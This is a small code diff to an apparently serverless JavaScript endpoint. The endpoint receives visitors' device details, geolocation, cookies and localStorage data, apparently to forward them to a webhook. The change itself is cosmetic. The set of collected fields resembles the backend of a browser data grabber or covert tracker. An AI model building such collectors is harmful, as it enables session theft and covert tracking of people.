@@ -1,4 +1,4 @@
-import fetch from 'node-fetch'; // Ensure node-fetch is installed for webhook requests
+import fetch from 'node-fetch';
 
 export default async (req, res) => {
     try {
@@ -9,8 +9,8 @@ export default async (req, res) => {
             osInfo, timestamp, timeSpent, activeTabDuration, 
             networkStatus, deviceType, memoryInfo, 
             hardwareConcurrency, connectionType, plugins, 
-            batteryLevel, isCharging, geolocation, cookies, 
-            localStorageData 
+            batteryLevel, isCharging, geolocation, 
+            cookies, localStorageData 
         } = req.body;
 
         // Prepare the data for logging
